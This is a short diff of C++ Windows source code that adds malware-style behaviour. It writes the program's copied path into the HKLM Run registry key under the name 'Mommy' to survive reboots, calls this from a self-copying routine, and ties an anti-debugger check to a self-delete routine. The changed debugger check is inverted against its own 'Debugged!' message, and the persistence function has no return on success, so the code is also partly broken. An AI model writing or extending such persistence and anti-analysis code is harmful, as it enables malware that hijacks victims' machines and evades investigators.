@@ -96,18 +96,28 @@ void PrintLastErrorMessage()
 	}
 }
 
-int Persistence(void)
+int Persistence(const wchar_t *path)
 {
 	HKEY hKey = NULL;
+	const wchar_t* nameKey = L"Mommy";
 	int lstatus = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
+
 	if (lstatus != ERROR_SUCCESS)
 	{
 		PrintLastErrorMessage();
 		return EXIT_FAILURE;
 	}
 
-	std::cout << "Registry key opened successfully!" << std::endl;
-	std::cout << hKey << std::endl;
+	int lstatus2 = RegSetValueExW(hKey, nameKey, 0, REG_SZ, (const BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
+
+	if (lstatus2 != ERROR_SUCCESS)
+	{
+		PrintLastErrorMessage();
+		RegCloseKey(hKey);
+		return EXIT_FAILURE;
+	}
+
+	RegCloseKey(hKey);
 }
 
 int DoubleItSelf(void)
@@ -133,6 +143,8 @@ int DoubleItSelf(void)
 	{
 		return EXIT_FAILURE;
 	}
+
+	Persistence(targetPath.c_str());
 
 	return EXIT_SUCCESS;
 }
@@ -161,8 +173,7 @@ int CopyExists(void)
 
 int main(void)
 {
-	Persistence();
-	if (IsDebugged())
+	if (!IsDebugged())
 	{
 		SelfKurtCobain();
 		std::cout << "Debugged!" << std::endl;
